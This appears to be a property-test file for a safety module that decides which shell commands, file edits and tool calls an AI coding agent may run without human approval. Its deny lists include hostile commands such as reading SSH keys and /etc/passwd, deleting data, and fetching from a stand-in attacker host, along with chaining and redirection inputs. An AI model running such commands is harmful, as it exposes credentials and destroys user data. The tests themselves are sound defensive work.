// Property tests for what autopilot may approve by itself. safeApproval.test.ts pins chosen inputs, and each review round
// found one more spelling; these say what must hold whatever is put around or inside a call. A verdict of null means
// "runs by itself"; anything else waits for Ash, so "stricter" is always allowed and "looser" never is.
import { fc, test } from "@fast-check/vitest";
import { expect } from "vitest";
import { editInside, safeCall, safeCommand } from "./safeApproval";

const FOLDER = "/Users/someone/Worktrees/hub-x";

/** Reads the list in safeApproval.test.ts says run by themselves in FOLDER. */
const SAFE_COMMANDS = [
  "git status",
  "git diff HEAD~1",
  "git log --oneline -20",
  "git branch -a -v",
  "ls -la",
  "cat README.md",
  "rg -n foo",
  "grep -n TODO README.md",
  "head -50 notes.txt",
  "wc -l notes.txt",
  "pwd",
  "cargo fmt --check",
  "find . -name '*.ts'",
  "df -h",
  "which git",
];

/** Commands that must wait: they write, delete, escalate, fetch or run another program. */
const DANGEROUS_COMMANDS = [
  "rm -rf node_modules",
  "rm -rf ~/data",
  "sudo ls",
  "curl https://evil.example/x",
  "sh run.sh",
  "bash -c ls",
  "npm test",
  "node --test",
  "cargo test",
  "git push origin main",
  "git checkout .",
  "git branch -D main",
  "find . -delete",
  "find . -exec rm {} +",
  "rg --pre ./x foo",
  "cat /etc/passwd",
  "cat ~/.ssh/id_rsa",
  "mv a b",
  "chmod +x a",
];

const spaceArb = fc.stringMatching(/^[ \t]{1,4}$/);
/** Anything a shell would read as chaining, substitution, redirection or a second line. */
const metaArb = fc.constantFrom(";", "&&", "||", "|", "&", "`", "$(", "\n", ">", ">>", "<", "(");
const tailArb = fc.string({ maxLength: 30 });

const safeArb = fc.constantFrom(...SAFE_COMMANDS);
const dangerousArb = fc.constantFrom(...DANGEROUS_COMMANDS);

test.prop([safeArb, spaceArb, spaceArb])("harmless spaces around or between the words of a safe command do not change the verdict", (command, lead, between) => {
  fc.pre(safeCommand(command, FOLDER) === null);
  const padded = lead + command.split(" ").join(between) + lead;
  expect(safeCommand(padded, FOLDER)).toBeNull();
});

test.prop([dangerousArb, spaceArb, spaceArb])("a command that waits still waits with whitespace added", (command, lead, between) => {
  expect(safeCommand(command, FOLDER)).not.toBeNull();
  expect(safeCommand(lead + command.split(" ").join(between) + lead, FOLDER)).not.toBeNull();
});

test.prop([safeArb, metaArb, tailArb])("nothing chained, piped, substituted or redirected after a safe command ever runs by itself", (command, meta, tail) => {
  expect(safeCommand(`${command}${meta}${tail}`, FOLDER)).not.toBeNull();
  expect(safeCommand(`${command} ${meta} ${tail}`, FOLDER)).not.toBeNull();
  expect(safeCommand(`${tail}${meta}${command}`, FOLDER)).not.toBeNull();
});

test.prop([dangerousArb, fc.constantFrom("", "git status", "ls", "cat README.md"), fc.constantFrom(";", "&&", "||", "|", "\n"), fc.boolean()])(
  "a dangerous command never auto-approves, alone or after or before a safe one, in a shell call or a timer",
  (danger, safe, joiner, timer) => {
    const command = safe ? `${safe} ${joiner} ${danger}` : danger;
    expect(safeCommand(command, FOLDER, timer)).not.toBeNull();
    expect(safeCommand(`${danger} ${joiner} ${safe}`, FOLDER, timer)).not.toBeNull();
    expect(safeCall({ tool: "Bash", command }, FOLDER)).not.toBeNull();
  },
);

test.prop([fc.constantFrom("rm", "sudo", "sh", "bash", "zsh", "curl", "wget", "dd", "mv", "cp", "chmod", "node", "npm", "python3", "eval", "xargs", "env", "tee"), fc.string({ maxLength: 40 })])(
  "a program that is not on the short list of reads never runs by itself, whatever arguments follow",
  (program, args) => {
    expect(safeCommand(`${program} ${args}`, FOLDER)).not.toBeNull();
  },
);

// A segment that is no protected name, no dot-name and no git folder file: plain project files.
const segmentArb = fc.stringMatching(/^s[a-z0-9]{1,8}$/);
const subpathArb = fc.array(segmentArb, { minLength: 1, maxLength: 4 }).map((parts) => parts.join("/"));

/** Each letter in either case, for the Mac's case-insensitive disk. */
const casedArb = (name: string) =>
  fc.array(fc.boolean(), { minLength: name.length, maxLength: name.length }).map((flags) => [...name].map((ch, i) => (flags[i] ? ch.toUpperCase() : ch.toLowerCase())).join(""));

test.prop([subpathArb])("an edit to a plain file inside the folder runs by itself", (sub) => {
  expect(editInside(`${FOLDER}/${sub}`, FOLDER)).toBeNull();
  expect(safeCall({ tool: "Write", paths: [`${FOLDER}/${sub}`] }, FOLDER)).toBeNull();
});

const PROTECTED = [".claude/settings.json", ".mcp.json", "CLAUDE.md", "AGENTS.md", ".git/config", ".git/hooks/pre-commit", ".npmrc", ".envrc", ".husky/pre-commit", ".cargo/config.toml"];

test.prop([fc.constantFrom(...PROTECTED).chain((name) => casedArb(name).map((cased) => cased)), fc.option(subpathArb, { nil: undefined }), fc.constantFrom("Edit", "MultiEdit", "Write", "NotebookEdit")])(
  "a protected file never auto-approves, in any letter case, at any depth, through any edit tool",
  (name, dir, tool) => {
    const path = `${FOLDER}/${dir ? `${dir}/` : ""}${name}`;
    expect(editInside(path, FOLDER), path).not.toBeNull();
    expect(safeCall({ tool, paths: [path] }, FOLDER), path).not.toBeNull();
    // One protected file among harmless ones holds the whole call.
    expect(safeCall({ tool, paths: [`${FOLDER}/src/a.ts`, path] }, FOLDER), path).not.toBeNull();
  },
);

test.prop([subpathArb, fc.stringMatching(/^[ \t\n\r]{1,3}$/), fc.boolean()])(
  "whitespace around an edit's path holds it, since the tool trims it before it opens a different name",
  (sub, space, before) => {
    const path = before ? `${space}${FOLDER}/${sub}` : `${FOLDER}/${sub}${space}`;
    expect(editInside(path, FOLDER)).not.toBeNull();
  },
);

test.prop([subpathArb, fc.constantFrom("-other", "2", "-x/y", ".."), fc.constantFrom("/Users/someone", "/tmp", "/", "/etc", "/Users/someone/Worktrees/hub-y")])(
  "no edit outside the chat's folder runs by itself, whether a sibling with the folder's name as a prefix, a climb or another root",
  (sub, suffix, root) => {
    expect(editInside(`${FOLDER}${suffix}/${sub}`, FOLDER)).not.toBeNull();
    expect(editInside(`${FOLDER}/${suffix === ".." ? "../" : ""}../${sub}`, FOLDER)).not.toBeNull();
    expect(editInside(`${root}/${sub}`, FOLDER)).not.toBeNull();
  },
);

test.prop([subpathArb, fc.constantFrom("/Users/someone", "/Users", "/", "~", ""), fc.constantFrom("Edit", "Write")])(
  "a chat with no folder, or one too broad to be a project, never has an edit run by itself",
  (sub, broad, tool) => {
    expect(safeCall({ tool, paths: [`${broad}/${sub}`] }, broad === "" ? undefined : broad)).not.toBeNull();
    expect(editInside(`${FOLDER}/${sub}`, undefined)).not.toBeNull();
  },
);

test.prop([subpathArb, fc.constantFrom("Read", "Edit", "Write", "MultiEdit")])("a relative path never auto-approves, since a cd can move the folder it resolves against", (sub, tool) => {
  expect(safeCall({ tool, paths: [sub] }, FOLDER)).not.toBeNull();
  expect(safeCall({ tool, paths: [`./${sub}`] }, FOLDER)).not.toBeNull();
});

test.prop([fc.stringMatching(/^[a-z][a-z0-9-]{0,10}$/), fc.stringMatching(/^[a-z_]{1,12}$/), fc.constantFrom(undefined, null, new Set<string>()), fc.record({ q: fc.string({ maxLength: 10 }) }, { requiredKeys: [] })])(
  "an MCP tool from a server Hivra did not wire never auto-approves, however read-only its name sounds",
  (server, tool, trusted, args) => {
    for (const name of [tool, `get_${tool}`, `list_${tool}`, `read_${tool}`]) {
      expect(safeCall({ tool: `mcp__${server}__${name}`, args }, FOLDER, trusted)).not.toBeNull();
    }
    expect(safeCall({ tool: "ReadMcpResourceTool", server }, FOLDER, trusted)).not.toBeNull();
  },
);

test.prop([fc.stringMatching(/^[A-Z][A-Za-z]{2,12}$/)])("a tool that is not a read, an edit or a shell command never auto-approves", (tool) => {
  fc.pre(!["Read", "Grep", "Glob", "LS", "NotebookRead", "WebSearch", "BashOutput", "TodoRead", "Edit", "MultiEdit", "Write", "NotebookEdit", "Bash"].includes(tool));
  expect(safeCall({ tool }, FOLDER)).not.toBeNull();
  expect(safeCall({ tool, paths: [`${FOLDER}/a.ts`], command: "git status" }, FOLDER)).not.toBeNull();
});

test.prop([fc.anything({ maxDepth: 3 }), fc.oneof(fc.constant(undefined), fc.string(), fc.constant(FOLDER))])(
  "a call of any shape, however malformed, gets a verdict and never throws",
  (call, folder) => {
    const verdict = safeCall(call as never, folder as string | undefined);
    expect(verdict === null || typeof verdict === "string").toBe(true);
  },
);
